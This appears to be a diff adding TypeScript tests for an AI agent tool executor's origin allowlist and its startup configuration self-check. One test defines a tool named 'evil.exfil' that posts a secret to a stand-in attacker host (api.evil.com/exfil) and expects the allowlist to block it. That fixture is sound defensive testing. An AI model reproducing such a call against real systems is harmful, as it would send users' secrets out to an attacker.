@@ -262,3 +262,305 @@ describe("executeOrbToolCalls", () => {
     );
   });
 });
+
+describe("agentToolExecutor allowlist edge cases", () => {
+  const ORIGINAL_NODE_ENV = process.env.NODE_ENV;
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+    delete process.env.ORB_TOOL_REGISTRY_JSON;
+    if (ORIGINAL_NODE_ENV === undefined) {
+      delete process.env.NODE_ENV;
+    } else {
+      process.env.NODE_ENV = ORIGINAL_NODE_ENV;
+    }
+  });
+
+  it("error message points operators at .env.example", async () => {
+    process.env.NODE_ENV = "production";
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "lookupWeather",
+        description: "weather",
+        method: "GET",
+        endpoint: "https://api.example.com/weather",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "lookupWeather", args: {} }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(out[0].ok).toBe(false);
+    expect(out[0].error).toContain("ORB_TOOL_ALLOWED_ORIGINS");
+    expect(out[0].error).toContain(".env.example");
+  });
+
+  it("dev mode auto-allows http://localhost without env config", async () => {
+    process.env.NODE_ENV = "development";
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const fetchMock = vi.fn(async () =>
+      new Response(JSON.stringify({ ok: true }), {
+        status: 200,
+        headers: { "content-type": "application/json" },
+      })
+    );
+    vi.stubGlobal("fetch", fetchMock);
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "local.ping",
+        description: "ping",
+        method: "GET",
+        endpoint: "http://localhost:8787/ping",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "local.ping" }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+    expect(out[0].ok).toBe(true);
+  });
+
+  it("dev mode auto-allows http://127.0.0.1 too", async () => {
+    process.env.NODE_ENV = "test";
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const fetchMock = vi.fn(async () =>
+      new Response("ok", {
+        status: 200,
+        headers: { "content-type": "text/plain" },
+      })
+    );
+    vi.stubGlobal("fetch", fetchMock);
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "ip.ping",
+        description: "ping",
+        method: "GET",
+        endpoint: "http://127.0.0.1:5000/health",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "ip.ping" }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(out[0].ok).toBe(true);
+  });
+
+  it("production never auto-allows localhost", async () => {
+    process.env.NODE_ENV = "production";
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "local.ping",
+        description: "ping",
+        method: "GET",
+        endpoint: "http://localhost:8787/ping",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "local.ping" }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(out[0].ok).toBe(false);
+    expect(out[0].error).toContain("ORB_TOOL_ALLOWED_ORIGINS");
+  });
+
+  it("dev mode still rejects non-localhost origins not in allowlist", async () => {
+    process.env.NODE_ENV = "development";
+    process.env.ORB_TOOL_ALLOWED_ORIGINS = "https://api.trusted.com";
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "evil.exfil",
+        description: "should be blocked",
+        method: "POST",
+        endpoint: "https://api.evil.com/exfil",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "evil.exfil", args: { secret: "x" } }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(out[0].ok).toBe(false);
+    expect(out[0].error).toContain("allowlist");
+  });
+
+  it("explicit allowlist origin still works in production", async () => {
+    process.env.NODE_ENV = "production";
+    process.env.ORB_TOOL_ALLOWED_ORIGINS = "https://api.trusted.com";
+
+    const fetchMock = vi.fn(async () =>
+      new Response(JSON.stringify({ ok: true }), {
+        status: 200,
+        headers: { "content-type": "application/json" },
+      })
+    );
+    vi.stubGlobal("fetch", fetchMock);
+
+    const tools: OrbApiTool[] = [
+      {
+        name: "trusted.ping",
+        description: "ping",
+        method: "GET",
+        endpoint: "https://api.trusted.com/ping",
+      },
+    ];
+
+    const out = await executeOrbToolCalls({
+      tools,
+      calls: [{ name: "trusted.ping" }],
+      userId: 1,
+      userRole: "user",
+      approved: true,
+    });
+
+    expect(out[0].ok).toBe(true);
+  });
+});
+
+describe("runOrbToolExecutorStartupSelfCheck", () => {
+  const ORIGINAL_NODE_ENV = process.env.NODE_ENV;
+
+  afterEach(() => {
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+    delete process.env.ORB_TOOL_REGISTRY_JSON;
+    if (ORIGINAL_NODE_ENV === undefined) {
+      delete process.env.NODE_ENV;
+    } else {
+      process.env.NODE_ENV = ORIGINAL_NODE_ENV;
+    }
+    vi.restoreAllMocks();
+  });
+
+  it("warns (not throws) when registry is set but allowlist is empty in dev", async () => {
+    const { _resetOrbToolExecutorSelfCheckForTest, runOrbToolExecutorStartupSelfCheck } =
+      await import("./services/agentToolExecutor");
+    _resetOrbToolExecutorSelfCheckForTest();
+
+    process.env.NODE_ENV = "development";
+    process.env.ORB_TOOL_REGISTRY_JSON = JSON.stringify([
+      { name: "x", description: "y", method: "GET", endpoint: "https://a.com/" },
+    ]);
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+
+    runOrbToolExecutorStartupSelfCheck();
+
+    expect(warnSpy).toHaveBeenCalledTimes(1);
+    expect(warnSpy.mock.calls[0][0]).toContain("ORB_TOOL_ALLOWED_ORIGINS");
+    expect(warnSpy.mock.calls[0][0]).toContain(".env.example");
+    expect(errorSpy).not.toHaveBeenCalled();
+  });
+
+  it("escalates to console.error in production", async () => {
+    const { _resetOrbToolExecutorSelfCheckForTest, runOrbToolExecutorStartupSelfCheck } =
+      await import("./services/agentToolExecutor");
+    _resetOrbToolExecutorSelfCheckForTest();
+
+    process.env.NODE_ENV = "production";
+    process.env.ORB_TOOL_REGISTRY_JSON = JSON.stringify([
+      { name: "x", description: "y", method: "GET", endpoint: "https://a.com/" },
+    ]);
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+
+    runOrbToolExecutorStartupSelfCheck();
+
+    expect(errorSpy).toHaveBeenCalledTimes(1);
+    expect(errorSpy.mock.calls[0][0]).toContain("ORB_TOOL_ALLOWED_ORIGINS");
+    expect(warnSpy).not.toHaveBeenCalled();
+  });
+
+  it("stays silent when registry is empty (no tools defined → no problem yet)", async () => {
+    const { _resetOrbToolExecutorSelfCheckForTest, runOrbToolExecutorStartupSelfCheck } =
+      await import("./services/agentToolExecutor");
+    _resetOrbToolExecutorSelfCheckForTest();
+
+    delete process.env.ORB_TOOL_REGISTRY_JSON;
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+
+    runOrbToolExecutorStartupSelfCheck();
+
+    expect(warnSpy).not.toHaveBeenCalled();
+    expect(errorSpy).not.toHaveBeenCalled();
+  });
+
+  it("stays silent when both registry AND allowlist are properly configured", async () => {
+    const { _resetOrbToolExecutorSelfCheckForTest, runOrbToolExecutorStartupSelfCheck } =
+      await import("./services/agentToolExecutor");
+    _resetOrbToolExecutorSelfCheckForTest();
+
+    process.env.ORB_TOOL_REGISTRY_JSON = JSON.stringify([
+      { name: "x", description: "y", method: "GET", endpoint: "https://a.com/" },
+    ]);
+    process.env.ORB_TOOL_ALLOWED_ORIGINS = "https://a.com";
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+
+    runOrbToolExecutorStartupSelfCheck();
+
+    expect(warnSpy).not.toHaveBeenCalled();
+    expect(errorSpy).not.toHaveBeenCalled();
+  });
+
+  it("only fires once per process even if called repeatedly", async () => {
+    const { _resetOrbToolExecutorSelfCheckForTest, runOrbToolExecutorStartupSelfCheck } =
+      await import("./services/agentToolExecutor");
+    _resetOrbToolExecutorSelfCheckForTest();
+
+    process.env.NODE_ENV = "development";
+    process.env.ORB_TOOL_REGISTRY_JSON = JSON.stringify([
+      { name: "x", description: "y", method: "GET", endpoint: "https://a.com/" },
+    ]);
+    delete process.env.ORB_TOOL_ALLOWED_ORIGINS;
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    runOrbToolExecutorStartupSelfCheck();
+    runOrbToolExecutorStartupSelfCheck();
+    runOrbToolExecutorStartupSelfCheck();
+
+    expect(warnSpy).toHaveBeenCalledTimes(1);
+  });
+});
